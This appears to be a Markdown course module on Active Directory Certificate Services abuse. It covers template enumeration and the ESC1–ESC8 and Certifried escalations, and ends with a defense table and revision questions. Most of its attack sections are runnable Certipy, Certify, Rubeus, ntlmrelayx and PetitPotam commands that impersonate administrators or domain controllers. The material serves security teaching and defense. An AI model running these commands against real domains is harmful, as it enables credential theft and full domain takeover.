# Certificate Abuse (AD CS)

## Unit 5 - Topic 5 | Privilege Escalation in AD

---

## Overview

**Active Directory Certificate Services (AD CS)** abuse exploits misconfigured certificate templates and enrollment services to escalate privileges. Discovered and systematized by SpecterOps in the "Certified Pre-Owned" whitepaper, AD CS attacks (ESC1-ESC8+) can lead to domain compromise through certificate-based authentication.

---

## 1. AD CS Fundamentals

```
AD CS ARCHITECTURE:

┌───────────┐    Certificate Request    ┌──────────────┐
│   User    │ ────────────────────────→ │  Certificate │
│           │                           │  Authority   │
│           │    Signed Certificate     │    (CA)      │
│           │ ←──────────────────────── │              │
└───────────┘                           └──────────────┘
      │                                        │
      │ Present certificate                    │
      │ for authentication                     │
      ↓                                        │
┌───────────┐    Verify certificate     ┌──────────────┐
│    DC     │ ────────────────────────→ │   CA Trust   │
│           │    (PKINIT / Kerberos)    │   Chain      │
└───────────┘                           └──────────────┘

KEY COMPONENTS:
├── Enterprise CA — Integrated with AD, issues certs
├── Certificate Templates — Define certificate properties
├── Enrollment — Who can request which certificates
├── PKINIT — Kerberos authentication using certificates
└── SAN (Subject Alternative Name) — Can specify identity!

WHY IT'S DANGEROUS:
├── Certificates = long-lived credentials (1-2 years!)
├── Survives password changes
├── Can impersonate any user (if misconfigured)
├── Not monitored as closely as passwords
└── Many environments have default misconfigurations
```

---

## 2. Finding Vulnerable Templates (Enumeration)

```bash
# === CERTIPY (Linux — Recommended) ===
certipy find -u user@corp.local -p pass -dc-ip dc01
# Generates: corp.local.json and corp.local.txt
# Identifies ALL vulnerable templates!
# Checks for: ESC1-ESC8+

# With specific output:
certipy find -u user@corp.local -p pass -dc-ip dc01 \
  -vulnerable -stdout
# Only shows vulnerable templates

# === CERTIFY (Windows — C#) ===
.\Certify.exe find /vulnerable
# Finds misconfigured templates

.\Certify.exe cas
# Lists Certificate Authorities

# === POWERSHELL ===
Get-ADObject -Filter {objectclass -eq 'pKICertificateTemplate'} \
  -Properties * | select name, mspki-certificate-name-flag, \
  mspki-enrollment-flag, mspki-ra-signature

# === BLOODHOUND ===
# BloodHound 4.1+ includes ADCS attack paths
# SharpHound -c all (includes certificate data)
```

---

## 3. Key Escalation Techniques (ESC1-ESC4)

```bash
# === ESC1: MISCONFIGURED CERTIFICATE TEMPLATE ===
# Conditions:
# 1. Client Authentication EKU (or any purpose)
# 2. CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (requester specifies SAN)
# 3. Low-privilege user can enroll
# → Attacker requests cert as Domain Admin!

# Certipy:
certipy req -u user@corp.local -p pass -dc-ip dc01 \
  -ca corp-CA -template VulnTemplate \
  -upn administrator@corp.local
# Requests certificate with Administrator's UPN!

# Authenticate with stolen cert:
certipy auth -pfx administrator.pfx -dc-ip dc01
# Gets NTLM hash of Administrator!

# Certify (Windows):
.\Certify.exe request /ca:corp-CA /template:VulnTemplate \
  /altname:administrator
# Then convert to PFX and use with Rubeus:
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt

# === ESC2: ANY PURPOSE CERTIFICATE ===
# Template has "Any Purpose" or no EKU
# Can be used for client auth → same as ESC1

# === ESC3: ENROLLMENT AGENT ABUSE ===
# Template allows enrollment agent certificate
# 1. Get enrollment agent cert
# 2. Use it to request cert on behalf of DA

# === ESC4: WRITABLE TEMPLATE ===
# If you have write access to a certificate template:
# Modify template to be vulnerable (add ESC1 conditions)
# Then exploit like ESC1

# Certipy:
certipy template -u user@corp.local -p pass \
  -template WritableTemplate \
  -save-old
# Modifies template to be vulnerable
# -save-old: Saves original for cleanup
```

---

## 4. Advanced ESC Attacks (ESC6-ESC8)

```bash
# === ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 ===
# CA flag that allows SAN in ANY certificate request
# Affects ALL templates, not just one!
# Check:
certutil -config "CA_NAME" -getreg policy\EditFlags
# If EDITF_ATTRIBUTESUBJECTALTNAME2 is set → vulnerable

# Exploit same as ESC1 (any template works)

# === ESC7: CA MANAGER APPROVAL BYPASS ===
# If you have ManageCA or ManageCertificates rights
# Can approve your own pending certificate requests

# === ESC8: NTLM RELAY TO AD CS WEB ENROLLMENT ===
# Relay NTLM auth to the CA's web enrollment page
# Coerce DC to authenticate → relay to CA → get DC cert!

# Setup:
# Terminal 1: Start relay to CA web enrollment
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Terminal 2: Coerce DC authentication (PetitPotam)
python3 PetitPotam.py attacker_ip dc01_ip

# Result: Certificate for DC machine account!
# Then authenticate:
certipy auth -pfx dc01.pfx -dc-ip dc01
# → NTLM hash of DC$ machine account
# → DCSync!

# === ESC11: CERTIFRIED (CVE-2022-26923) ===
# Create machine account with same dNSHostName as DC
# Request certificate → authenticate as DC → DCSync!
certipy account create -u user@corp.local -p pass \
  -user 'FAKEMACHINE$' -pass 'Pass123!' \
  -dns dc01.corp.local
certipy req -u 'FAKEMACHINE$@corp.local' -p 'Pass123!' \
  -ca corp-CA -template Machine
certipy auth -pfx dc01.pfx -dc-ip dc01
```

---

## 5. Defense Against AD CS Abuse

| Defense | Description |
|---------|-------------|
| **Audit templates** | Remove ENROLLEE_SUPPLIES_SUBJECT from sensitive templates |
| **Restrict enrollment** | Limit who can enroll in each template |
| **Remove Any Purpose** | Set specific EKUs only |
| **CA permissions** | Restrict ManageCA and ManageCertificates |
| **Disable web enrollment** | Remove HTTP-based enrollment if not needed |
| **Remove EDITF flag** | `certutil -config CA -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` |
| **Monitor** | Track certificate requests (Event IDs 4886, 4887) |
| **PSCert** | Use PSCert or Certipy for defensive auditing |

---

## Summary Table

| Attack | Condition | Impact |
|--------|-----------|--------|
| **ESC1** | Enrollee supplies SAN + auth EKU | Impersonate any user |
| **ESC4** | Writable template | Modify to ESC1 |
| **ESC6** | EDITF flag on CA | Any template = ESC1 |
| **ESC8** | NTLM relay to CA web | DC cert → DCSync |
| **Certipy** | Primary tool | Enumerate + exploit |

---

## Quick Revision Questions

1. **What makes a certificate template vulnerable to ESC1?**
2. **Why are AD CS attacks particularly dangerous for persistence?**
3. **What tool is used for AD CS enumeration and exploitation?**
4. **How does ESC8 achieve domain compromise?**
5. **What is the EDITF_ATTRIBUTESUBJECTALTNAME2 flag?**

---

[← Previous: Group Policy Exploitation](04-group-policy-exploitation.md)

---

*Unit 5 - Topic 5 of 5 | [Back to README](../README.md) | [Next Unit: Lateral Movement →](../06-Lateral-Movement/01-remote-execution-techniques.md)*
